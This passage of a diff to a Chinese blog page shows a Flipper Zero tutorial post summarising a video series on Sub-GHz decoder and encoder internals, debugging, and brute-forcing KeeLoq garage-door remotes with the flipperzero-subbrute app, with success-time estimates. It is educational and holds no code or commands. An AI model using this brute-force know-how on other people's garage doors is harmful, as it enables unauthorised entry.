+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://youtu.be/O4bEuYwytv0?si=iDzJmKERKojx1zjR" >https://youtu.be/O4bEuYwytv0?si=iDzJmKERKojx1zjR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>encoder 其實跟 decoder 差不多，但 <code>dederialize</code> 的時候會多設定 <code>.upload</code>，<code>.size_upload</code>，<code>.front</code>，<code>.repeat</code>，然後當我們發射信號的時候會呼叫 <code>yield</code>，然後會檢查有沒有正常運行，如果沒有的話會返回一個 reset level，然後要結束時會呼叫 <code>stop</code>。</p>
+<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>接著作者會透過 Flipper 的 CLI 工具，以及在原始碼下斷點的方式，來走一遍 encoder 和 decoder 的流程：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/flipper_cli.png"
+                      alt="cli"
+                ><br>Flipper Cli 的網址：<a class="link"   target="_blank" rel="noopener" href="https://lab.flipper.net/cli" >https://lab.flipper.net/cli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>我們可以透過像是上面的方式來呼叫 <code>decode_raw</code>，接著就可以用 vs code 之類的工具進入 debugging mode 下斷點來看看剛剛學到的流程：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/flipper_debug.png"
+                      alt="debug"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=O4bEuYwytv0&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=6" >https://www.youtube.com/watch?v=O4bEuYwytv0&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>有興趣追完整個 debug 流程的歡迎去看第六集：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=O4bEuYwytv0&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=6" >https://www.youtube.com/watch?v=O4bEuYwytv0&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Genie"><a href="#Genie" class="headerlink" title="Genie"></a>Genie</h3><p>接著在七到九集作者用 Genie Garage Door 跟大家示範前面提到那些運作機制是怎麼應用在實際例子中。</p>
+<h2 id="Brute-Force-KeeLoq"><a href="#Brute-Force-KeeLoq" class="headerlink" title="Brute Force KeeLoq"></a>Brute Force KeeLoq</h2><p>接著在這個系列的最後一集，作者想跟大家提到其實 Brute Force KeyLoq 並非不可能，而且 Brute Force 也並非單純的一個一個猜，是一些方式可以提高我們成功的機率以及技巧的，像是：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/graph.png"
+                      alt="graph"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-LtyF7LUQvs&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=10" >https://www.youtube.com/watch?v=-LtyF7LUQvs&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>從上圖可以看到每次增加 19 會比每次增加 1 的成功速度更快，而每次增加 27 會跟每次增加 1 插到兩倍以上。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/pie_chart.png"
+                      alt="pie"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-LtyF7LUQvs&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=10" >https://www.youtube.com/watch?v=-LtyF7LUQvs&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>作者這邊提供了 brute force 的時間和機率關係，可以看到超過 75% 的機率都會超過一年，最大值甚至到 44 年。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/another_data.png"
+                      alt="another_data"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-LtyF7LUQvs&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=10" >https://www.youtube.com/watch?v=-LtyF7LUQvs&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>這裡還有另外一個更詳細的數據，這次影片展示的是第一種情況也就是在 12978 種情況下，當我們每秒測試 2.87 個，大約七十五分鐘會成功，而當數量來到最大值四十億的時候，在同樣的測試速度下會需要我們大約四十四年才會成功。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/twelve.png"
+                      alt="twelve"
+                ><br>圖片來源：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-LtyF7LUQvs&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=10" >https://www.youtube.com/watch?v=-LtyF7LUQvs&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>上面這張圖可以看到上次作者測試的狀況。<br>接著作者示範了如何用 flipperzero-subbrute 這個應用程式去做到剛才的 brute force，詳情可見：<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-LtyF7LUQvs&list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&index=10" >https://www.youtube.com/watch?v=-LtyF7LUQvs&amp;list=PLM1cyTMe-PYJfnlDk3NjM85kU5VyCViNp&amp;index=10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>OK，這大概是今天的介紹。因為 Flipper Zero 其實還有很多有趣的協議和功能等著我們去介紹，所以今天比較像是告訴大家 Sub-GHz 還有很多有趣的東西可以玩，大家可以自行去做更深入的探索，也非常推薦大家去觀看 Derek Jamison 做的影片。明天我們則會開始介紹 125 kHz RFID，各位明天見！</p>
 
         </div>
 
@@ -766,18 +786,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> HackTheBox-Machines BoardLight Writeup</li>
+        <li><strong>Title:</strong> Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day07 - 比馬里亞納海溝還深的 Sub-GHz 解析最終章</li>
         <li><strong>Author:</strong> kazma</li>
         <li><strong>Created at
-                :</strong> 2024-08-11 11:36:19</li>
+                :</strong> 2024-09-21 18:00:29</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-08-11 20:49:29
+                    :</strong> 2024-09-21 19:57:42
             </li>
         
         <li>
-            <strong>Link:</strong> https://kazma.tw/2024/08/11/HackTheBox-Machines-BoardLight-Writeup/
+            <strong>Link:</strong> https://kazma.tw/2024/09/21/Flipper-Zero-宇宙最強攻略：30-天帶你從入門到入坑-Day07-比馬里亞納海溝還深的-Sub-GHz-解析最終章/
         </li>
         <li>
             <strong>
@@ -799,19 +819,15 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                        <a href="/tags/flipper-zero/">#flipper-zero</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/htb/">#htb</a>&nbsp;
+                        <a href="/tags/iThome/">#iThome</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/machines/">#machines</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/pt/">#pt</a>&nbsp;
+                        <a href="/tags/toy/">#toy</a>&nbsp;
                     </li>
                 
             </ul>
@@ -825,13 +841,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/08/11/HackTheBox-Challenges-Regularity-Writeup/"
+                        href="/2024/09/22/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day08-%E7%94%A8-Flipper-Zero-125-kHz-RFID-%E4%B8%80%E7%AA%BA%E6%B5%81%E6%B5%AA%E8%B2%93%E7%8B%97%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">HackTheBox-Challenges Regularity Writeup</span>
+                                <span class="post-nav-title-item">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day08 - 用 Flipper Zero 125 kHz RFID 一窺流浪貓狗的前世今生</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -841,10 +857,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/08/11/HackTheBox-Machines-GreenHorn-Writeup/"
+                        href="/2024/09/20/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day06-Sub-GHz-%E5%AF%A6%E6%88%B0%EF%BC%9A%E5%B8%82%E5%94%AE%E8%A8%AD%E5%82%99%E7%9A%84%E7%84%A1%E6%83%85%E5%A4%A7%E5%B1%A0%E6%AE%BA%E5%AF%A6%E9%8C%84/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">HackTheBox-Machines GreenHorn Writeup</span>
+                                <span class="post-nav-title-item">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day06 - Sub-GHz 實戰：市售設備的無情大屠殺實錄</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -923,8 +939,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">HackTheBox-Machines BoardLight Writeup</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a></li></ol>
+        <div class="page-title">Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day07 - 比馬里亞納海溝還深的 Sub-GHz 解析最終章</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B3%87%E5%AE%89%E5%80%AB%E7%90%86%E5%AE%A3%E5%B0%8E"><span class="nav-text">資安倫理宣導</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Security-1-0-2-0-decode"><span class="nav-text">Security+ 1.0&#x2F;2.0 decode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sub-GHz-Decoder-Encoder"><span class="nav-text">Sub-GHz Decoder&#x2F;Encoder</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Decoder"><span class="nav-text">Decoder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Encoder"><span class="nav-text">Encoder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Debug"><span class="nav-text">Debug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Genie"><span class="nav-text">Genie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Brute-Force-KeeLoq"><span class="nav-text">Brute Force KeeLoq</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%89%E8%AE%9A%E8%A8%82%E9%96%B1%E6%94%B6%E8%97%8F%E5%B0%8F%E9%88%B4%E5%99%B9%E5%8F%AE%E5%8F%AE%E5%8F%AE"><span class="nav-text">按讚訂閱收藏小鈴噹叮叮叮</span></a></li></ol>
 
     </div>
 </div>
@@ -957,7 +973,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        65 posts in total
+                        63 posts in total
                     </span>
                     
                 </p>
